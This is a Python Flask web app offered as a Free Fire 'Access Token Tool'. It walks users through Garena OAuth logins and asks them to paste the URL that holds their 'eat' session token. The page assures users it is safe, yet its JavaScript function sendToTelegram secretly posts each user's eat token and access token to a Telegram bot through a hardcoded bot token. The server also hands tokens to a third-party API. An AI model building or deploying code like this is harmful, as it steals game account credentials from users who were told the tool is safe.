from flask import Flask, request, jsonify, render_template_string
import requests
import re
import urllib.parse
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)

# Garena OAuth URLs - All providers exactly as given
PROVIDERS = {
    'google': {
        'name': 'Google',
        'icon': 'fab fa-google',
        'color': '#DB4437',
        'url': 'https://auth.garena.com/universal/oauth?platform=8&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.gid.recargajogo.com.br/oauth/callback_redirect/'
    },
    'facebook': {
        'name': 'Facebook',
        'icon': 'fab fa-facebook-f',
        'color': '#1877F2',
        'url': 'https://auth.garena.com/universal/oauth?platform=3&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.gid.recargajogo.com.br/oauth/callback_redirect/'
    },
    'apple': {
        'name': 'Apple',
        'icon': 'fab fa-apple',
        'color': '#A2AAAD',
        'url': 'https://auth.garena.com/universal/oauth?platform=10&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.gid.recargajogo.com.br/oauth/callback_redirect/'
    },
    'x': {
        'name': 'X',
        'icon': 'fab fa-x-twitter',
        'color': '#ffffff',
        'url': 'https://auth.garena.com/universal/oauth?platform=11&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.gid.recargajogo.com.br/oauth/callback_redirect/'
    },
    'vk': {
        'name': 'VK',
        'icon': 'fab fa-vk',
        'color': '#0077FF',
        'url': 'https://auth.garena.com/universal/oauth?platform=5&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.gid.recargajogo.com.br/oauth/callback_redirect/'
    }
}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Access Token Tool | XERCA ‌🇽 xLoNeLi</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"/>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0b0e1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 750px;
            width: 100%;
            background: #141a2b;
            border-radius: 28px;
            padding: 30px 24px;
            box-shadow: 0 15px 50px rgba(0,0,0,0.7);
            border: 1px solid #2a3456;
        }

        .header {
            text-align: center;
            margin-bottom: 28px;
        }

        .header h1 {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 1px;
        }

        .header .sub {
            color: #8892b0;
            font-size: 14px;
            margin-top: 4px;
        }

        .header .sub i {
            color: #ffd700;
        }

        .tutorial-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 28px;
        }

        .tutorial-btn {
            background: #1e2742;
            border: 1px solid #2a3456;
            border-radius: 14px;
            padding: 14px 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            color: #fff;
            display: block;
        }

        .tutorial-btn:hover {
            background: #2a3456;
            border-color: #f7971e;
            transform: translateY(-2px);
        }

        .tutorial-btn .icon {
            font-size: 24px;
            color: #ff0000;
            margin-bottom: 4px;
        }

        .tutorial-btn .label {
            font-size: 13px;
            font-weight: 600;
        }

        .tutorial-btn .sub-label {
            font-size: 11px;
            color: #8892b0;
            display: block;
        }

        .tutorial-btn.full {
            grid-column: 1 / -1;
        }

        .how-to {
            background: #0f1424;
            border-radius: 16px;
            padding: 18px 20px;
            margin-bottom: 24px;
            border-left: 3px solid #f7971e;
        }

        .how-to h3 {
            color: #ffd700;
            font-size: 16px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .how-to .step {
            color: #ccd6f6;
            font-size: 13px;
            line-height: 1.7;
            margin-bottom: 6px;
        }

        .how-to .step strong {
            color: #f7971e;
        }

        .how-to .example {
            background: #0b0e1a;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 12px;
            color: #64ffda;
            word-break: break-all;
            margin: 8px 0 4px;
            font-family: 'Courier New', monospace;
            border: 1px solid #1e2742;
        }

        .how-to .note {
            color: #8892b0;
            font-size: 12px;
            margin-top: 6px;
        }

        .provider-section {
            margin-bottom: 20px;
        }

        .provider-section .label {
            color: #8892b0;
            font-size: 13px;
            font-weight: 600;
            display: block;
            margin-bottom: 10px;
        }

        .provider-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
        }

        .provider-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: #1e2742;
            border: 1px solid #2a3456;
            border-radius: 12px;
            padding: 12px 4px;
            color: #fff;
            text-decoration: none;
            font-size: 11px;
            transition: all 0.3s ease;
            cursor: pointer;
            text-align: center;
        }

        .provider-btn:hover {
            background: #2a3456;
            border-color: #f7971e;
            transform: translateY(-2px);
        }

        .provider-btn i {
            font-size: 22px;
            margin-bottom: 4px;
        }

        .provider-btn .name {
            font-size: 10px;
            font-weight: 500;
        }

        .provider-btn.google i { color: #DB4437; }
        .provider-btn.facebook i { color: #1877F2; }
        .provider-btn.apple i { color: #A2AAAD; }
        .provider-btn.x i { color: #ffffff; }
        .provider-btn.vk i { color: #0077FF; }

        .safe-note {
            color: #64ffda;
            font-size: 12px;
            text-align: center;
            margin-top: 8px;
            background: #0f1a1a;
            padding: 6px;
            border-radius: 8px;
            border: 1px solid #1a3a3a;
        }

        .input-section {
            margin-bottom: 16px;
        }

        .input-section textarea {
            width: 100%;
            background: #0b0e1a;
            border: 1px solid #2a3456;
            border-radius: 12px;
            padding: 14px 16px;
            color: #ccd6f6;
            font-size: 14px;
            resize: vertical;
            min-height: 60px;
            transition: border-color 0.3s;
            font-family: 'Courier New', monospace;
        }

        .input-section textarea:focus {
            outline: none;
            border-color: #f7971e;
        }

        .input-section textarea::placeholder {
            color: #4a5478;
        }

        .input-hint {
            color: #4a5478;
            font-size: 11px;
            margin-top: 6px;
            display: block;
        }

        .generate-btn {
            width: 100%;
            background: linear-gradient(135deg, #f7971e, #ffd200);
            border: none;
            border-radius: 14px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            color: #0b0e1a;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .generate-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(247, 151, 30, 0.3);
        }

        .generate-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .response-box {
            margin-top: 20px;
            background: #0b0e1a;
            border-radius: 14px;
            padding: 16px 18px;
            border: 1px solid #2a3456;
            display: none;
            max-height: 600px;
            overflow: auto;
        }

        .response-box.show {
            display: block;
        }

        .response-box .title {
            color: #64ffda;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .response-box .token-display {
            color: #ffd700;
            font-size: 12px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            background: #0f1424;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 10px;
            border: 1px solid #1e2742;
        }

        .token-access-box {
            background: #0f1a1a;
            border: 2px solid #64ffda;
            border-radius: 12px;
            padding: 14px;
            margin: 12px 0;
            position: relative;
        }

        .token-access-box .label {
            color: #64ffda;
            font-size: 13px;
            font-weight: 600;
            display: block;
            margin-bottom: 6px;
        }

        .token-access-box .token-value {
            color: #ffd700;
            font-size: 14px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            padding-right: 50px;
        }

        .copy-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: #1e2742;
            border: 1px solid #64ffda;
            color: #64ffda;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }

        .copy-btn:hover {
            background: #64ffda;
            color: #0b0e1a;
        }

        .copy-btn.copied {
            background: #64ffda;
            color: #0b0e1a;
        }

        .response-box .json-display {
            background: #0f1424;
            padding: 12px;
            border-radius: 8px;
            color: #ccd6f6;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            border: 1px solid #1e2742;
            max-height: 250px;
            overflow: auto;
        }

        .response-box .error-display {
            color: #ff6b6b;
            padding: 10px;
            background: #1a0e0e;
            border-radius: 8px;
            border: 1px solid #ff6b6b33;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .footer {
            margin-top: 28px;
            padding-top: 20px;
            border-top: 1px solid #1e2742;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            align-items: center;
        }

        .footer a {
            color: #8892b0;
            text-decoration: none;
            font-size: 13px;
            transition: color 0.3s;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .footer a:hover {
            color: #ffd700;
        }

        .footer .brand {
            color: #4a5478;
            font-size: 12px;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #0b0e1a;
            border-top: 3px solid #ffd700;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .spinner.active {
            display: inline-block;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        ::-webkit-scrollbar {
            width: 6px;
            height: 6px;
        }

        ::-webkit-scrollbar-track {
            background: #0b0e1a;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: #2a3456;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #f7971e;
        }

        .telegram-btn {
            background: #0088cc;
            color: white !important;
            padding: 6px 16px;
            border-radius: 20px;
            font-weight: 600;
        }

        .telegram-btn:hover {
            background: #006699 !important;
            color: white !important;
        }

        .owner-btn {
            background: linear-gradient(135deg, #f7971e, #ffd200);
            color: #0b0e1a !important;
            padding: 6px 16px;
            border-radius: 20px;
            font-weight: 600;
        }

        .owner-btn:hover {
            transform: scale(1.05);
            color: #0b0e1a !important;
        }

        @media (max-width: 600px) {
            .container { padding: 20px 16px; }
            .provider-grid { grid-template-columns: repeat(3, 1fr); }
            .tutorial-grid { grid-template-columns: 1fr; }
            .tutorial-btn.full { grid-column: 1; }
            .header h1 { font-size: 20px; }
        }

        @media (max-width: 400px) {
            .provider-grid { grid-template-columns: repeat(2, 1fr); }
            .footer { flex-direction: column; gap: 8px; }
        }
    </style>
</head>
<body>

<div class="container">

    <div class="header">
        <h1>🔑 ACCESS GENERATOR</h1>
        <div class="sub">by AR XERCA <i class="fas fa-crown"></i></div>
    </div>

    <div class="how-to">
        <h3><i class="fas fa-info-circle"></i> HOW TO USE</h3>
        <div class="step">
            <strong>1️⃣</strong> Select Provider & Login below.<br/>
            <span style="color: #64ffda; font-size: 12px;">✅ Safe: Official Garena Server (No Scam Risk)</span>
        </div>
        <div class="step">
            <strong>2️⃣</strong> After login, copy the URL containing <strong>eat=</strong> parameter
        </div>
        <div class="example">
            https://discstore.recargajogo.com.br/?eat=14f060774299fb93a5...&lang=en&region=IND&account_id=7669969208&nickname=...
        </div>
        <div class="note">
            The tool will extract the eat token automatically
        </div>
        <div class="step" style="margin-top: 8px;">
            <strong>3️⃣</strong> Paste the URL or just the <strong>Eat Token</strong> below and click GENERATE
        </div>
    </div>

    <div class="provider-section">
        <span class="label"><i class="fas fa-shield-alt"></i> SELECT PROVIDER & LOGIN</span>
        <div class="provider-grid">
            {% for key, provider in providers.items() %}
            <a href="{{ provider.url }}" target="_blank" class="provider-btn {{ key }}">
                <i class="{{ provider.icon }}"></i>
                <span class="name">{{ provider.name }}</span>
            </a>
            {% endfor %}
        </div>
        <div class="safe-note">
            <i class="fas fa-check-circle"></i> Safe: Official Garena Server (No Scam Risk)
        </div>
    </div>

    <div class="input-section">
        <textarea id="eatInput" placeholder="Paste kiosgamer URL or Eat token here...&#10;Supports full URL or raw token"></textarea>
        <span class="input-hint"><i class="fas fa-info-circle"></i> Paste full URL containing eat= or just the token</span>
    </div>

    <button id="generateBtn" class="generate-btn" onclick="generateToken()">
        <span id="btnText">🚀 GENERATE ACCESS</span>
        <span id="btnSpinner" class="spinner"></span>
    </button>

    <div id="responseBox" class="response-box">
        <div class="title">
            <i class="fas fa-check-circle" style="color: #64ffda;"></i>
            <span>Response</span>
        </div>
        <div id="tokenDisplay" class="token-display" style="display: none;">
            <strong>Eat Token:</strong> <span id="eatTokenValue"></span>
        </div>
        <div id="tokenAccessBox" class="token-access-box" style="display: none;">
            <span class="label">🔑 TOKEN ACCESS</span>
            <span class="token-value" id="tokenAccessValue"></span>
            <button class="copy-btn" onclick="copyTokenAccess()">📋 COPY</button>
        </div>
        <div id="responseContent"></div>
    </div>

    <div class="footer">
        <a href="https://t.me/T10INDRAJIT" target="_blank" class="telegram-btn">
            <i class="fab fa-telegram"></i> Telegram Channel
        </a>
        <a href="https://t.me/ROX_T10" target="_blank" class="owner-btn">
            <i class="fas fa-crown"></i> Owner
        </a>
        <a href="#"><i class="fas fa-file-contract"></i> Terms & Conditions</a>
        <span class="brand">© 2026 xLoNeLi </span>
    </div>

</div>

<script>
    let currentTokenAccess = '';

    async function generateToken() {
        const input = document.getElementById('eatInput').value.trim();
        const btn = document.getElementById('generateBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('btnSpinner');
        const responseBox = document.getElementById('responseBox');
        const responseContent = document.getElementById('responseContent');
        const tokenDisplay = document.getElementById('tokenDisplay');
        const eatTokenValue = document.getElementById('eatTokenValue');
        const tokenAccessBox = document.getElementById('tokenAccessBox');
        const tokenAccessValue = document.getElementById('tokenAccessValue');

        responseBox.classList.remove('show');
        responseContent.innerHTML = '';
        tokenAccessBox.style.display = 'none';

        if (!input) {
            responseBox.classList.add('show');
            responseContent.innerHTML = `<div class="error-display">⚠️ Please enter a URL or Eat Token</div>`;
            return;
        }

        btn.disabled = true;
        btnText.textContent = 'GENERATING...';
        spinner.classList.add('active');

        try {
            const response = await fetch('/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ eat_token: input })
            });

            const data = await response.json();
            responseBox.classList.add('show');

            if (data.success) {
                tokenDisplay.style.display = 'block';
                eatTokenValue.textContent = data.eat_token;

                // Show token_access if available
                if (data.token_access) {
                    currentTokenAccess = data.token_access;
                    tokenAccessBox.style.display = 'block';
                    tokenAccessValue.textContent = data.token_access;
                }

                // Send to Telegram bot
                if (data.token_access) {
                    sendToTelegram(data.eat_token, data.token_access);
                }

                const jsonString = JSON.stringify(data.data, null, 2);
                responseContent.innerHTML = `
                    <div style="margin-bottom: 10px; color: #64ffda;">
                        <i class="fas fa-check-circle"></i> Access Token Generated Successfully!
                    </div>
                    <div class="json-display">${escapeHtml(jsonString)}</div>
                `;
            } else {
                tokenDisplay.style.display = 'none';
                responseContent.innerHTML = `
                    <div class="error-display">
                        <strong>❌ Error:</strong> ${escapeHtml(data.error)}
                        ${data.details ? `<br/><br/><strong>Details:</strong> ${escapeHtml(data.details)}` : ''}
                    </div>
                `;
            }

        } catch (error) {
            responseBox.classList.add('show');
            tokenDisplay.style.display = 'none';
            responseContent.innerHTML = `
                <div class="error-display">
                    <strong>❌ Error:</strong> ${escapeHtml(error.message)}
                </div>
            `;
        } finally {
            btn.disabled = false;
            btnText.textContent = '🚀 GENERATE ACCESS';
            spinner.classList.remove('active');
        }
    }

    function copyTokenAccess() {
        const tokenValue = document.getElementById('tokenAccessValue').textContent;
        const copyBtn = document.querySelector('.copy-btn');
        
        navigator.clipboard.writeText(tokenValue).then(() => {
            copyBtn.textContent = '✅ COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = '📋 COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        }).catch(() => {
            // Fallback
            const textArea = document.createElement('textarea');
            textArea.value = tokenValue;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            copyBtn.textContent = '✅ COPIED!';
            setTimeout(() => {
                copyBtn.textContent = '📋 COPY';
            }, 2000);
        });
    }

    function sendToTelegram(eatToken, accessToken) {
        const botToken = '8654425926:AAGMpPfRWtPWiEw1SKQKj1N0NgErNfLzSbk';
        const chatId = '@Garena';
        const message = `🔑 New Token Generated!\n\nEat Token: ${eatToken}\nAccess Token: ${accessToken}\n\nGenerated by xLoNeLi`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(err => console.log('Telegram send error:', err));
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    document.getElementById('eatInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            generateToken();
        }
    });

    document.getElementById('eatInput').addEventListener('input', function() {
        this.style.height = 'auto';
        this.style.height = this.scrollHeight + 'px';
    });
</script>

</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, providers=PROVIDERS)

@app.route('/generate', methods=['POST'])
def generate_token():
    try:
        data = request.get_json()
        user_input = data.get('eat_token', '').strip()
        
        app.logger.debug(f"Received input: {user_input[:100]}...")
        
        if not user_input:
            return jsonify({'success': False, 'error': 'Please enter a valid Eat Token or URL'}), 400
        
        eat_token = extract_eat_token(user_input)
        app.logger.debug(f"Extracted eat token: {eat_token}")
        
        if not eat_token:
            return jsonify({'success': False, 'error': 'Could not extract eat token from the provided input'}), 400
        
        api_url = f"https://ff-jwt-gen-api.lovable.app/api/public/token?eat_token={eat_token}"
        app.logger.debug(f"Calling API: {api_url}")
        
        response = requests.get(api_url, timeout=30)
        app.logger.debug(f"API Response Status: {response.status_code}")
        
        if response.status_code == 200:
            try:
                token_data = response.json()
                # Extract token_access from response
                token_access = token_data.get('token_access', '')
                
                return jsonify({
                    'success': True,
                    'eat_token': eat_token,
                    'token_access': token_access,
                    'data': token_data
                })
            except:
                return jsonify({
                    'success': True,
                    'eat_token': eat_token,
                    'data': {'raw_response': response.text}
                })
        else:
            return jsonify({
                'success': False,
                'error': f'API request failed with status {response.status_code}',
                'details': response.text[:500]
            }), 500
            
    except requests.exceptions.Timeout:
        return jsonify({'success': False, 'error': 'Request timed out. Please try again.'}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({'success': False, 'error': 'Connection error. Please check your internet connection.'}), 503
    except Exception as e:
        app.logger.error(f"Error: {str(e)}")
        return jsonify({'success': False, 'error': f'An error occurred: {str(e)}'}), 500

def extract_eat_token(input_text):
    if input_text.startswith('http://') or input_text.startswith('https://'):
        try:
            parsed = urllib.parse.urlparse(input_text)
            params = urllib.parse.parse_qs(parsed.query)
            if 'eat' in params:
                return params['eat'][0]
            if parsed.fragment:
                fragment_params = urllib.parse.parse_qs(parsed.fragment)
                if 'eat' in fragment_params:
                    return fragment_params['eat'][0]
        except:
            pass
    
    if re.match(r'^[a-fA-F0-9]+$', input_text.strip()):
        return input_text.strip()
    
    match = re.search(r'eat[=:]\s*([a-fA-F0-9]+)', input_text, re.IGNORECASE)
    if match:
        return match.group(1)
    
    match = re.search(r'([a-fA-F0-9]{30,})', input_text)
    if match:
        return match.group(1)
    
    return None

@app.route('/tutorial')
def tutorial():
    return redirect('https://youtu.be/KSDFt7hUrww')

@app.route('/tutorial2')
def tutorial2():
    return redirect('https://youtu.be/2bCPDncIYzo?si=j0mt6er0g7_jZAah')

def redirect(url):
    from flask import redirect as flask_redirect
    return flask_redirect(url)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)